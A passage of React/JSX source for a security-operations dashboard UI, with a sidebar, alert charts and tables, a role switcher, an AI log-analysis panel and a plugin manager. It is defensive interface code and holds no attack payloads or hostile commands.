                  ? 'bg-emerald-500/10 border-l-2 border-emerald-500 text-emerald-400'
                  : 'text-slate-400 hover:text-white hover:bg-slate-800/40'
              }`}
            >
              <Activity className="w-4 h-4 text-emerald-500 shrink-0" />
              <span>SOC Operations</span>
              {activeTab !== 'dashboard' && (
                <span className="ml-auto w-1.5 h-1.5 rounded-full bg-emerald-500 animate-ping"></span>
              )}
            </button>

            <button
              onClick={() => setActiveTab('ai-analyst')}
              className={`w-full flex items-center space-x-3 px-3 py-2.5 rounded transition-all text-left ${
                activeTab === 'ai-analyst'
                  ? 'bg-cyan-500/10 border-l-2 border-cyan-500 text-cyan-400'
                  : 'text-slate-400 hover:text-white hover:bg-slate-800/40'
              }`}
            >
              <Terminal className="w-4 h-4 text-cyan-400 shrink-0" />
              <span>AI Threat Analyst</span>
            </button>

            <button
              onClick={() => setActiveTab('plugin-manager')}
              className={`w-full flex items-center space-x-3 px-3 py-2.5 rounded transition-all text-left ${
                activeTab === 'plugin-manager'
                  ? 'bg-amber-500/10 border-l-2 border-amber-500 text-amber-400'
                  : 'text-slate-400 hover:text-white hover:bg-slate-800/40'
              }`}
            >
              <Layers className="w-4 h-4 text-amber-400 shrink-0" />
              <span>Plugin Manager</span>
            </button>

            <button
              onClick={() => setActiveTab('exporter')}
              className={`w-full flex items-center space-x-3 px-3 py-2.5 rounded transition-all text-left ${
                activeTab === 'exporter'
                  ? 'bg-sky-500/10 border-l-2 border-sky-500 text-sky-400'
                  : 'text-slate-400 hover:text-white hover:bg-slate-800/40'
              }`}
            >
              <FileCode className="w-4 h-4 text-sky-400 shrink-0" />
              <span>Deployment Center</span>
            </button>

            <button
              onClick={() => setActiveTab('api-console')}
              className={`w-full flex items-center space-x-3 px-3 py-2.5 rounded transition-all text-left ${
                activeTab === 'api-console'
                  ? 'bg-purple-500/10 border-l-2 border-purple-500 text-purple-400'
                  : 'text-slate-400 hover:text-white hover:bg-slate-800/40'
              }`}
            >
              <Globe className="w-4 h-4 text-purple-400 shrink-0" />
              <span>REST Client / OpenAPI</span>
            </button>

            <button
              onClick={() => setActiveTab('rbac-audit')}
              className={`w-full flex items-center space-x-3 px-3 py-2.5 rounded transition-all text-left ${
                activeTab === 'rbac-audit'
                  ? 'bg-rose-500/10 border-l-2 border-rose-500 text-rose-400'
                  : 'text-slate-400 hover:text-white hover:bg-slate-800/40'
              }`}
            >
              <UserCheck className="w-4 h-4 text-rose-400 shrink-0" />
              <span>RBAC & Auditing</span>
            </button>
          </nav>
        </div>

        {/* Info & Settings Footer in Sidebar */}
        <div className="p-4 border-t border-slate-800 font-mono text-xs text-slate-500 space-y-3 bg-slate-950/20">
          <div className="flex justify-between items-center">
            <span>SECURE LINK:</span>
            <span className="text-emerald-500 font-bold">MUTUAL TLS</span>
          </div>
          <div className="flex justify-between items-center">
            <span>HOST PLATFORM:</span>
            <span className="text-slate-300">KALI LINUX</span>
          </div>
          <div className="p-2.5 rounded bg-slate-950 border border-slate-800/80 text-[10px]">
            <p className="text-slate-400 leading-relaxed font-sans">
              Designed with <strong>SOLID</strong> modules, repository patterns, and full async pipelines.
            </p>
          </div>
        </div>
      </aside>

      {/* 2. MAIN HUB WORKSPACE */}
      <main className="flex-1 flex flex-col min-h-screen bg-slate-950/95 overflow-x-hidden z-20">
        
        {/* TOP COMMAND BAR / CONTROL HUB */}
        <header className="px-6 py-4 border-b border-slate-800 flex flex-col lg:flex-row items-stretch lg:items-center justify-between space-y-3 lg:space-y-0 bg-slate-900/60 backdrop-blur-md">
          {/* Status metrics display */}
          <div className="flex flex-wrap items-center gap-6 text-xs font-mono">
            <div className="flex items-center space-x-2">
              <span className="relative flex h-2 w-2">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
              </span>
              <span className="text-slate-400">ENGINE:</span>
              <span className="text-white font-bold tracking-wider">{systemLoad.socketStatus}</span>
            </div>

            <div className="flex items-center space-x-3 bg-slate-950 border border-slate-800 px-3 py-1.5 rounded">
              <Cpu className="w-3.5 h-3.5 text-cyan-400 animate-spin" style={{ animationDuration: '6s' }} />
              <span className="text-slate-500">CPU LOAD:</span>
              <span className="text-cyan-400 font-bold">{systemLoad.cpu}%</span>
            </div>

            <div className="flex items-center space-x-3 bg-slate-950 border border-slate-800 px-3 py-1.5 rounded">
              <Server className="w-3.5 h-3.5 text-amber-500" />
              <span className="text-slate-500">MEMORY (RAM):</span>
              <span className="text-amber-500 font-bold">{systemLoad.ram}%</span>
            </div>

            <div className="flex items-center space-x-3 bg-slate-950 border border-slate-800 px-3 py-1.5 rounded">
              <Lock className="w-3.5 h-3.5 text-emerald-400" />
              <span className="text-slate-500">TIME:</span>
              <span className="text-white font-bold">{currentTime}</span>
            </div>
          </div>

          {/* Security clearance RBAC switch */}
          <div className="flex items-center space-x-3 self-end lg:self-auto">
            <span className="text-xs font-mono text-slate-500">CLEARANCE CERTIFICATE:</span>
            <div className="relative inline-flex bg-slate-950 border border-slate-800 rounded p-1">
              <button
                onClick={() => {
                  setRbacRole('Administrator');
                  setAuditLogs(prev => [
                    { timestamp: new Date().toTimeString().split(' ')[0], role: 'Administrator', event: ' Clearance switched to ADMINISTRATOR', severity: 'Warning' },
                    ...prev
                  ]);
                }}
                className={`px-3 py-1 text-xs font-mono rounded transition-all ${
                  rbacRole === 'Administrator' ? 'bg-red-500/20 text-red-400 border border-red-500/30' : 'text-slate-500 hover:text-white'
                }`}
              >
                ADMIN
              </button>
              <button
                onClick={() => {
                  setRbacRole('Analyst');
                  setAuditLogs(prev => [
                    { timestamp: new Date().toTimeString().split(' ')[0], role: 'Analyst', event: ' Clearance switched to ANALYST', severity: 'Info' },
                    ...prev
                  ]);
                }}
                className={`px-3 py-1 text-xs font-mono rounded transition-all ${
                  rbacRole === 'Analyst' ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' : 'text-slate-500 hover:text-white'
                }`}
              >
                ANALYST
              </button>
              <button
                onClick={() => {
                  setRbacRole('ReadOnly');
                  setAuditLogs(prev => [
                    { timestamp: new Date().toTimeString().split(' ')[0], role: 'ReadOnly', event: ' Clearance demoted to GUEST/READ-ONLY', severity: 'Info' },
                    ...prev
                  ]);
                }}
                className={`px-3 py-1 text-xs font-mono rounded transition-all ${
                  rbacRole === 'ReadOnly' ? 'bg-slate-800 text-slate-300 border border-slate-700' : 'text-slate-500 hover:text-white'
                }`}
              >
                GUEST
              </button>
            </div>
          </div>
        </header>

        {/* CONTAINER WORKSPACE FOR CHOSEN TAB */}
        <div className="flex-1 p-6 space-y-6 overflow-y-auto">

          {/* -------------------------------------------------- */}
          {/* TAB 1: SOC DASHBOARD PANEL */}
          {/* -------------------------------------------------- */}
          {activeTab === 'dashboard' && (
            <motion.div
              initial={{ opacity: 0, y: 15 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0 }}
              className="space-y-6"
            >
              {/* Alert Ribbon summary cards */}
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
                <div className="bg-slate-900/60 border border-slate-800 p-4 rounded flex items-center justify-between">
                  <div>
                    <span className="text-xs font-mono text-slate-400 tracking-wider">THREATS INTERCEPTED</span>
                    <h3 className="text-2xl font-bold text-white font-mono mt-1">{totalAlertsCount}</h3>
                  </div>
                  <div className="w-10 h-10 rounded bg-red-500/10 border border-red-500/30 flex items-center justify-center text-red-400">
                    <AlertTriangle className="w-5 h-5 animate-bounce" />
                  </div>
                </div>

                <div className="bg-slate-900/60 border border-slate-800 p-4 rounded flex items-center justify-between">
                  <div>
                    <span className="text-xs font-mono text-slate-400 tracking-wider">ACTIVE AGENT FEEDS</span>
                    <h3 className="text-2xl font-bold text-emerald-400 font-mono mt-1">
                      {plugins.filter(p => p.enabled).length} <span className="text-xs text-slate-500 font-normal">/ {plugins.length}</span>
                    </h3>
                  </div>
                  <div className="w-10 h-10 rounded bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400">
                    <Layers className="w-5 h-5" />
                  </div>
                </div>

                <div className="bg-slate-900/60 border border-slate-800 p-4 rounded flex items-center justify-between">
                  <div>
                    <span className="text-xs font-mono text-slate-400 tracking-wider">SECURED ENDPOINTS</span>
                    <h3 className="text-2xl font-bold text-cyan-400 font-mono mt-1">100%</h3>
                  </div>
                  <div className="w-10 h-10 rounded bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-center text-cyan-400">
                    <CheckCircle className="w-5 h-5" />
                  </div>
                </div>

                <div className="bg-slate-900/60 border border-slate-800 p-4 rounded flex items-center justify-between">
                  <div>
                    <span className="text-xs font-mono text-slate-400 tracking-wider">AUDIT CONFORMS</span>
                    <h3 className="text-2xl font-bold text-white font-mono mt-1">ISO 27001</h3>
                  </div>
                  <div className="w-10 h-10 rounded bg-purple-500/10 border border-purple-500/30 flex items-center justify-center text-purple-400">
                    <Shield className="w-5 h-5" />
                  </div>
                </div>
              </div>

              {/* Data visualizations (Recharts) */}
              <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                
                {/* 1. Real-time Threat incidence over time (AreaChart) */}
                <div className="lg:col-span-2 bg-slate-900/40 border border-slate-800 p-5 rounded">
                  <div className="flex items-center justify-between mb-4">
                    <div>
                      <h4 className="font-mono font-bold text-sm tracking-wider text-white">HISTORICAL METRIC FEED</h4>
                      <p className="text-xs text-slate-400 font-sans mt-0.5">Automated aggregation of modular honeypot alerts</p>
                    </div>
                    <div className="px-2 py-1 bg-slate-850 rounded text-[10px] font-mono text-slate-400 border border-slate-800">
                      ROLLING SEVEN-HOUR LOG
                    </div>
                  </div>
                  <div className="h-[240px]">
                    <ResponsiveContainer width="100%" height="100%">
                      <AreaChart data={historicalTrends} margin={{ top: 10, right: 10, left: -20, bottom: 0 }}>
                        <defs>
                          <linearGradient id="colorAlerts" x1="0" y1="0" x2="0" y2="1">
                            <stop offset="5%" stopColor="#10b981" stopOpacity={0.2}/>
                            <stop offset="95%" stopColor="#10b981" stopOpacity={0}/>
                          </linearGradient>
                          <linearGradient id="colorBlocked" x1="0" y1="0" x2="0" y2="1">
                            <stop offset="5%" stopColor="#ef4444" stopOpacity={0.15}/>
                            <stop offset="95%" stopColor="#ef4444" stopOpacity={0}/>
                          </linearGradient>
                        </defs>
                        <XAxis dataKey="time" stroke="#64748b" fontSize={10} fontStyle="italic" />
                        <YAxis stroke="#64748b" fontSize={10} />
                        <Tooltip contentStyle={{ backgroundColor: '#1e293b', borderColor: '#475569', fontSize: 11, color: '#f8fafc' }} />
                        <Area type="monotone" dataKey="alerts" name="Total Alerts" stroke="#10b981" fillOpacity={1} fill="url(#colorAlerts)" strokeWidth={2} />
                        <Area type="monotone" dataKey="blocked" name="Blocked Intrusion" stroke="#ef4444" fillOpacity={1} fill="url(#colorBlocked)" strokeWidth={1.5} />
                      </AreaChart>
                    </ResponsiveContainer>
                  </div>
                </div>

                {/* 2. Vector classification Pie Chart */}
                <div className="bg-slate-900/40 border border-slate-800 p-5 rounded flex flex-col justify-between">
                  <div>
                    <h4 className="font-mono font-bold text-sm tracking-wider text-white mb-3">SEVERITY CLASSIFICATION</h4>
                    <p className="text-xs text-slate-400 font-sans mt-0.5 mb-2">Live honeypot attack metrics sorted by risk index</p>
                  </div>
                  <div className="h-[180px] flex items-center justify-center relative">
                    <ResponsiveContainer width="100%" height="100%">
                      <PieChart>
                        <Pie
                          data={severityPieData}
                          innerRadius={50}
                          outerRadius={70}
                          paddingAngle={3}
                          dataKey="value"
                        >
                          {severityPieData.map((entry, index) => (
                            <Cell key={`cell-${index}`} fill={entry.color} />
                          ))}
                        </Pie>
                        <Tooltip contentStyle={{ backgroundColor: '#1e293b', borderColor: '#475569', fontSize: 11 }} />
                      </PieChart>
                    </ResponsiveContainer>
                    <div className="absolute flex flex-col items-center">
                      <span className="text-2xl font-bold font-mono text-white">{threatEvents.length}</span>
                      <span className="text-[9px] font-mono tracking-widest text-slate-500 font-semibold uppercase">EVENTS</span>
                    </div>
                  </div>
                  {/* Legend listing */}
                  <div className="grid grid-cols-2 gap-2 mt-2">
                    {severityPieData.map((item, i) => (
                      <div key={i} className="flex items-center space-x-1.5 text-xs font-mono">
                        <span className="w-2.5 h-2.5 rounded-full shrink-0" style={{ backgroundColor: item.color }} />
                        <span className="text-slate-400">{item.name} ({item.value})</span>
                      </div>
                    ))}
                  </div>
                </div>

              </div>

              {/* Real-time Threat Logs Feed ticker */}
              <div className="bg-slate-900/60 border border-slate-800 rounded">
                <div className="p-4 border-b border-slate-800 flex items-center justify-between bg-slate-950/40">
                  <div className="flex items-center space-x-2">
                    <div className="w-2.5 h-2.5 rounded-full bg-red-500 animate-ping"></div>
                    <h4 className="font-mono font-bold text-sm tracking-wider text-white uppercase">INTRUSION DETECTOR AGENT ALERTS</h4>
                  </div>
                  
                  {/* Pause / Play ticker */}
                  <div className="flex items-center space-x-2">
                    <button
                      onClick={() => setPaused(!paused)}
                      className={`px-3 py-1.5 rounded text-xs font-mono flex items-center space-x-1.5 border transition-all ${
                        paused 
                          ? 'bg-amber-500/10 border-amber-500/30 text-amber-400 hover:bg-amber-500/20' 
                          : 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400 hover:bg-emerald-500/20'
                      }`}
                    >
                      {paused ? <Play className="w-3.5 h-3.5" /> : <Pause className="w-3.5 h-3.5" />}
                      <span>{paused ? 'RESUME STREAM' : 'PAUSE FEEDS'}</span>
                    </button>
                    <button
                      onClick={() => {
                        setThreatEvents(INITIAL_THREAT_EVENTS);
                        setAuditLogs(prev => [
                          { timestamp: new Date().toTimeString().split(' ')[0], role: 'System', event: 'Cleared active SOC alarm lists', severity: 'Info' },
                          ...prev
                        ]);
                      }}
                      className="p-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded border border-slate-700 text-xs"
                      title="Reset Feed Logs"
                    >
                      <RefreshCw className="w-3.5 h-3.5" />
                    </button>
                  </div>
                </div>

                {/* Alerts table */}
                <div className="overflow-x-auto">
                  <table className="w-full text-left font-mono text-xs border-collapse">
                    <thead>
                      <tr className="bg-slate-950/60 border-b border-slate-800 text-slate-400 uppercase text-[10px] tracking-wider">
                        <th className="p-3">TIMESTAMP</th>
                        <th className="p-3">ATTACK INCIDENT</th>
                        <th className="p-3">SOURCE IP</th>
                        <th className="p-3">PORT</th>
                        <th className="p-3">VECTOR</th>
                        <th className="p-3 text-right">SEVERITY</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-800/60">
                      <AnimatePresence initial={false}>
                        {threatEvents.map((alert) => {
                          const isHighOrCritical = alert.severity === 'Critical' || alert.severity === 'High';
                          return (
                            <motion.tr
                              key={alert.id}
                              initial={{ opacity: 0, x: -10 }}
                              animate={{ opacity: 1, x: 0 }}
                              exit={{ opacity: 0 }}
                              className="hover:bg-slate-850/40 transition-colors"
                            >
                              <td className="p-3 text-slate-400">{alert.timestamp}</td>
                              <td className="p-3 text-white font-medium flex items-center space-x-2">
                                <span className={`w-1.5 h-1.5 rounded-full ${
                                  alert.severity === 'Critical' ? 'bg-red-500' :
                                  alert.severity === 'High' ? 'bg-orange-500' :
                                  alert.severity === 'Medium' ? 'bg-amber-500' : 'bg-cyan-500'
                                }`} />
                                <span>{alert.event}</span>
                              </td>
                              <td className="p-3 font-semibold text-cyan-400">{alert.ip}</td>
                              <td className="p-3 text-slate-400">{alert.target_port || 'ANY'}</td>
                              <td className="p-3"><span className="px-2 py-0.5 bg-slate-800 rounded border border-slate-700 text-slate-300">{alert.attack_vector}</span></td>
                              <td className="p-3 text-right">
                                <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                                  alert.severity === 'Critical' ? 'bg-red-500/10 text-red-400 border border-red-500/20' :
                                  alert.severity === 'High' ? 'bg-orange-500/10 text-orange-400 border border-orange-500/20' :
                                  alert.severity === 'Medium' ? 'bg-amber-500/10 text-amber-400 border border-amber-500/20' :
                                  'bg-sky-500/10 text-sky-400 border border-sky-500/20'
                                }`}>
                                  {alert.severity}
                                </span>
                              </td>
                            </motion.tr>
                          );
                        })}
                      </AnimatePresence>
                    </tbody>
                  </table>
                </div>
              </div>
            </motion.div>
          )}

          {/* -------------------------------------------------- */}
          {/* TAB 2: AI THREAT ANALYST PANEL (GEMINI POWERED) */}
          {/* -------------------------------------------------- */}
          {activeTab === 'ai-analyst' && (
            <motion.div
              initial={{ opacity: 0, y: 15 }}
              animate={{ opacity: 1, y: 0 }}
              className="grid grid-cols-1 lg:grid-cols-5 gap-6"
            >
              {/* Left Column: paste and settings */}
              <div className="lg:col-span-2 space-y-4">
                <div className="bg-slate-900 border border-slate-800 p-5 rounded space-y-4">
                  <div className="flex items-center space-x-2 text-cyan-400">
                    <Terminal className="w-5 h-5" />
                    <h4 className="font-mono font-bold tracking-wider text-sm text-white">LOG ANALYST CONSOLE</h4>
                  </div>
                  
                  <p className="text-xs text-slate-400 font-sans leading-relaxed">
                    Paste raw Nginx access logs, Linux syslog failures, SSH packets, or threat descriptions.
                    Aegis AI uses Gemini to analyze signatures, classify threats, extract IOCs, and generate clean patches.
                  </p>

                  {/* Sample buttons */}
                  <div className="space-y-1">
                    <span className="text-[10px] font-mono text-slate-500 tracking-wider">LOAD LOG BLUEPRINT TEMPLATE:</span>
                    <div className="flex flex-wrap gap-2">
                      <button
                        onClick={() => {
                          setAiLogsInput(SAMPLE_LOGS.sshFailures);
                          setAiAnalysisType('SSH Log Correlation & Brute Force Hunt');
                        }}
                        className="px-2 py-1 bg-slate-850 hover:bg-slate-800 rounded border border-slate-700 text-slate-300 text-[10px] font-mono"
                      >
                        SSH Brute Force
                      </button>
                      <button
                        onClick={() => {
                          setAiLogsInput(SAMPLE_LOGS.sqlInjection);
                          setAiAnalysisType('Web Application Threat Hunting & SQLi Classify');
                        }}
                        className="px-2 py-1 bg-slate-850 hover:bg-slate-800 rounded border border-slate-700 text-slate-300 text-[10px] font-mono"
                      >
                        SQL Injection
                      </button>
                      <button
                        onClick={() => {
                          setAiLogsInput(SAMPLE_LOGS.nginxReverseShell);
                          setAiAnalysisType('LFI & PHP Reverse Shell Backdoor Isolation');
                        }}
                        className="px-2 py-1 bg-slate-850 hover:bg-slate-800 rounded border border-slate-700 text-slate-300 text-[10px] font-mono"
                      >
                        Reverse Shell PHP
                      </button>
                    </div>
                  </div>

                  {/* Input form */}
                  <div className="space-y-2 font-mono text-xs">
                    <label className="text-slate-400 block font-semibold">PASTE SECURITY INCIDENT DATA:</label>
                    <textarea
                      value={aiLogsInput}
                      onChange={(e) => setAiLogsInput(e.target.value)}
                      placeholder="Paste threat intelligence payload here..."
                      className="w-full h-[180px] bg-slate-950 border border-slate-800 rounded p-3 text-slate-200 focus:outline-none focus:border-cyan-500/80 font-mono text-[11px] custom-scrollbar"
                    />
                  </div>

                  {/* Scan Category Selector */}
                  <div className="space-y-2 font-mono text-xs">
                    <label className="text-slate-400 block font-semibold">SECURITY CLASSIFICATION ENGINE:</label>
                    <select
                      value={aiAnalysisType}
                      onChange={(e) => setAiAnalysisType(e.target.value)}
                      className="w-full bg-slate-950 border border-slate-800 rounded p-2 text-slate-300 focus:outline-none focus:border-cyan-500 font-mono"
                    >
                      <option value="SSH Log Correlation & Brute Force Hunt">SSH Brute Force Correlator</option>
                      <option value="Web Application Threat Hunting & SQLi Classify">SQLi & API Payload Audit</option>
                      <option value="LFI & PHP Reverse Shell Backdoor Isolation">Reverse Shell PHP Backdoor hunt</option>
                      <option value="Vulnerability Scanner Log Explanation">Dynamic Port Sweep Analysis</option>
                      <option value="Full Incident Forensics & Hardening Policy">Full System Incident Report</option>
                    </select>
                  </div>

                  {/* Execute Button */}
                  <button
                    onClick={handleAIAnalysis}
                    disabled={aiLoading || !aiLogsInput.trim()}
                    className={`w-full py-2.5 rounded font-mono font-bold tracking-wider text-xs transition-all flex items-center justify-center space-x-2 border ${
                      aiLoading 
                        ? 'bg-slate-850 border-slate-700 text-slate-500 cursor-not-allowed'
                        : 'bg-cyan-500/10 border-cyan-500/30 text-cyan-400 hover:bg-cyan-500/20 cursor-pointer shadow-[0_0_15px_rgba(6,182,212,0.15)]'
                    }`}
                  >
                    {aiLoading ? (
                      <>
                        <RefreshCw className="w-4 h-4 animate-spin text-cyan-400" />
                        <span>ANALYZING SIGNATURES...</span>
                      </>
                    ) : (
                      <>
                        <Send className="w-4 h-4 text-cyan-400" />
                        <span>SUBMIT FOR COGNITIVE EVALUATION</span>
                      </>
                    )}
                  </button>
                </div>

                {/* Tips Box */}
                <div className="bg-slate-900/40 border border-slate-800 p-4 rounded text-xs text-slate-400 font-sans space-y-2">
                  <div className="flex items-center space-x-1 text-cyan-400 font-semibold font-mono">
                    <Info className="w-4 h-4 shrink-0" />
                    <span>DEFENSIVE INTEL SPECIFICATIONS</span>
                  </div>
                  <p className="leading-relaxed">
                    AI models are configured server-side. No API keys are leaked to client components.
                    Analysis includes automated compliance parsing against MITRE ATT&CK vectors and OWASP security practices.
                  </p>
                </div>
              </div>

              {/* Right Column: response markdown container */}
              <div className="lg:col-span-3">
                <div className="bg-slate-900 border border-slate-800 rounded flex flex-col h-full min-h-[480px]">
                  <div className="p-4 border-b border-slate-800 flex items-center justify-between bg-slate-950/40 font-mono text-xs">
                    <div className="flex items-center space-x-2">
                      <div className="w-2 h-2 rounded-full bg-cyan-400 animate-pulse"></div>
                      <span className="font-bold text-white uppercase">THREAT ANALYSIS DECK</span>
                    </div>

                    {/* Copy Response Actions */}
                    {aiOutput && (
                      <div className="flex items-center space-x-2">
                        <button
                          onClick={() => copyToClipboard(aiOutput)}
                          className="px-2.5 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded border border-slate-700 flex items-center space-x-1.5"
                        >
                          <Copy className="w-3.5 h-3.5 text-cyan-400" />
                          <span>{isCopied ? 'COPIED!' : 'COPY'}</span>
                        </button>
                        <button
                          onClick={() => downloadFileOnDisk('aegis_ai_report.md', aiOutput)}
                          className="px-2.5 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded border border-slate-700 flex items-center space-x-1.5"
                        >
                          <Download className="w-3.5 h-3.5" />
                          <span>SAVE REPORT</span>
                        </button>
                      </div>
                    )}
                  </div>

                  <div className="p-6 flex-1 overflow-y-auto max-h-[580px] custom-scrollbar text-slate-300 font-mono text-xs space-y-4">
                    {aiLoading ? (
                      <div className="flex flex-col items-center justify-center h-full py-20 space-y-4">
                        <div className="relative flex items-center justify-center">
                          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-t-2 border-cyan-400"></div>
                          <Shield className="w-5 h-5 text-cyan-400 absolute" />
                        </div>
                        <div className="text-center space-y-1">
                          <h5 className="font-bold text-white text-sm animate-pulse">COGNITIVE DECK ENGAGED</h5>
                          <p className="text-slate-500 text-[11px]">Querying Google Gemini 3.5 Flash Model Server-side...</p>
                        </div>
                      </div>
                    ) : aiOutput ? (
                      <div className="prose prose-invert max-w-none text-slate-300 leading-relaxed space-y-4">
                        {aiOutput.split('\n').map((line, idx) => {
                          if (line.startsWith('###')) {
                            return <h5 key={idx} className="text-white font-bold border-b border-slate-800 pb-1.5 mt-4 text-xs font-mono tracking-wider text-cyan-400 uppercase">{line.replace('###', '')}</h5>;
                          } else if (line.startsWith('##')) {
                            return <h4 key={idx} className="text-white font-bold text-sm font-mono mt-4 text-emerald-400 uppercase">{line.replace('##', '')}</h4>;
                          } else if (line.startsWith('#')) {
                            return <h3 key={idx} className="text-white font-bold text-base font-mono tracking-widest text-center py-2 bg-slate-950 border border-slate-800 rounded">{line.replace('#', '')}</h3>;
                          } else if (line.trim().startsWith('-') || line.trim().startsWith('*')) {
                            return (
                              <div key={idx} className="flex items-start space-x-2 pl-2">
                                <span className="text-emerald-500 shrink-0 mt-1">▶</span>
                                <span>{line.replace(/^[\s-*]+/, '')}</span>
                              </div>
                            );
                          } else if (line.startsWith('```')) {
                            return null; // Skip raw code blocks in rendering loop, format standard code lines nicely
                          }
                          return <p key={idx} className={line.trim() === "" ? "h-2" : ""}>{line}</p>;
                        })}
                      </div>
                    ) : (
                      <div className="flex flex-col items-center justify-center h-full text-center py-20 text-slate-500">
                        <Terminal className="w-12 h-12 mb-3 text-slate-700 animate-pulse" />
                        <h5 className="text-slate-400 font-bold">TERMINAL STANDBY</h5>
                        <p className="max-w-md mt-1 leading-relaxed text-[11px]">
                          Select a log blueprint or paste your raw system traces in the console to correlate threat levels and access security mitigation strategies.
                        </p>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </motion.div>
          )}

          {/* -------------------------------------------------- */}
          {/* TAB 3: MODULAR PLUGIN MANAGER PANEL */}
          {/* -------------------------------------------------- */}
          {activeTab === 'plugin-manager' && (
            <motion.div
              initial={{ opacity: 0, y: 15 }}
              animate={{ opacity: 1, y: 0 }}
              className="space-y-6"
            >
              <div className="bg-slate-900 border border-slate-800 p-5 rounded flex flex-col md:flex-row justify-between items-start md:items-center gap-4 bg-slate-900/60">
                <div className="space-y-1">
                  <h4 className="font-mono font-bold tracking-wider text-white text-base">MODULAR PLUG-AND-PLAY ARCHITECTURE</h4>
                  <p className="text-xs text-slate-400 font-sans">
                    Enable or hot-swap security modules. System changes apply dynamically to active backend routines.
                  </p>
                </div>

                <button
                  onClick={() => setShowAddPlugin(!showAddPlugin)}
                  className="px-4 py-2 bg-amber-500/10 hover:bg-amber-500/20 text-amber-400 rounded border border-amber-500/30 font-mono text-xs font-bold flex items-center space-x-2 transition-all"
                >
                  <Plus className="w-4 h-4 text-amber-400" />
                  <span>REGISTER CUSTOM MODULE</span>
                </button>
              </div>

              {/* Dynamic plugin registry box */}
              {showAddPlugin && (
                <motion.form
                  onSubmit={handleCreatePlugin}
                  initial={{ opacity: 0, height: 0 }}
                  animate={{ opacity: 1, height: 'auto' }}
                  className="bg-slate-900 border border-amber-500/20 p-5 rounded space-y-4"
                >
                  <h5 className="font-mono font-bold text-amber-400 text-xs tracking-wider uppercase">VIRTUAL MODULE SPECIFICATION PANEL</h5>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div className="space-y-1 font-mono text-xs">
                      <label className="text-slate-400 block font-semibold">MODULE NAME:</label>
                      <input
                        type="text"
                        value={newPluginName}
                        onChange={(e) => setNewPluginName(e.target.value)}
                        placeholder="e.g. Scapy Packet Correlator"
                        className="w-full bg-slate-950 border border-slate-800 p-2 rounded text-slate-100 focus:outline-none focus:border-amber-500"
                        required
                      />
                    </div>
                    <div className="space-y-1 font-mono text-xs">
                      <label className="text-slate-400 block font-semibold">COGNITIVE CATEGORY:</label>
                      <select
                        value={newPluginCategory}
                        onChange={(e) => setNewPluginCategory(e.target.value)}
                        className="w-full bg-slate-950 border border-slate-800 p-2 rounded text-slate-300 focus:outline-none"
                      >
                        <option value="Reconnaissance">Reconnaissance</option>
                        <option value="IDS Defenses">IDS Defenses</option>
                        <option value="Threat Hunting">Threat Hunting</option>
                        <option value="Storage Audit">Storage Audit</option>
                        <option value="Compliance">Compliance</option>
                      </select>
                    </div>
                  </div>
                  <div className="flex justify-end space-x-2 font-mono text-xs">
                    <button
                      type="button"
                      onClick={() => setShowAddPlugin(false)}
                      className="px-3 py-1.5 bg-slate-800 hover:bg-slate-750 text-slate-400 rounded"
                    >
                      CANCEL
                    </button>
                    <button
                      type="submit"
                      className="px-4 py-1.5 bg-amber-500/20 hover:bg-amber-500/30 text-amber-400 border border-amber-500/30 rounded font-bold"
                    >
                      HOT-DEPLOY MODULE
                    </button>
                  </div>
                </motion.form>
              )}

              {/* Grid of plugins */}
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                {plugins.map((plugin) => (
                  <div
                    key={plugin.id}
                    className={`bg-slate-900 border rounded p-5 flex flex-col justify-between transition-all relative overflow-hidden group ${
                      plugin.enabled 
                        ? 'border-emerald-500/20 bg-slate-900/60 shadow-[0_0_15px_rgba(16,185,129,0.03)]' 
                        : 'border-slate-800 bg-slate-900/30'
                    }`}
                  >
                    {/* Glow indicators */}
                    <div className={`absolute top-0 right-0 w-24 h-24 rounded-full filter blur-[40px] opacity-10 transition-colors ${
                      plugin.enabled ? 'bg-emerald-500' : 'bg-red-500'
                    }`}></div>

                    <div className="space-y-3 z-10 relative">
                      {/* Title Header */}
                      <div className="flex items-center justify-between">
                        <span className="text-[9px] font-mono tracking-widest text-slate-500 uppercase font-semibold">
                          {plugin.category}
                        </span>
                        <span className={`px-2 py-0.5 rounded text-[9px] font-mono font-bold ${
                          plugin.enabled ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' : 'bg-slate-800 text-slate-400 border border-slate-700'
                        }`}>
                          {plugin.enabled ? 'ACTIVE' : 'DEACTIVE'}
                        </span>
                      </div>

                      <div className="space-y-1">
                        <h5 className="font-mono font-bold text-white text-sm group-hover:text-emerald-400 transition-colors">{plugin.name}</h5>
                        <div className="flex items-center space-x-2 text-[10px] font-mono text-slate-400">
                          <span>VER: {plugin.version}</span>
                          <span>•</span>
                          <span>AUTH: {plugin.author}</span>
                        </div>
                      </div>

                      <p className="text-xs text-slate-400 font-sans leading-relaxed">{plugin.desc}</p>
                    </div>

                    {/* Controls Footer */}
                    <div className="border-t border-slate-800/80 mt-4 pt-3 flex items-center justify-between font-mono text-xs z-10">
                      <span className="text-slate-500">TOGGLE MODULE STATE:</span>
                      
                      <button
                        onClick={() => handleTogglePlugin(plugin.id)}
                        className={`w-14 h-6 rounded-full p-0.5 transition-colors cursor-pointer relative ${
                          plugin.enabled ? 'bg-emerald-500' : 'bg-slate-800'
                        }`}
                        aria-label="Toggle Plugin State"
                      >
                        <div className={`w-5 h-5 rounded-full bg-white transition-all transform ${
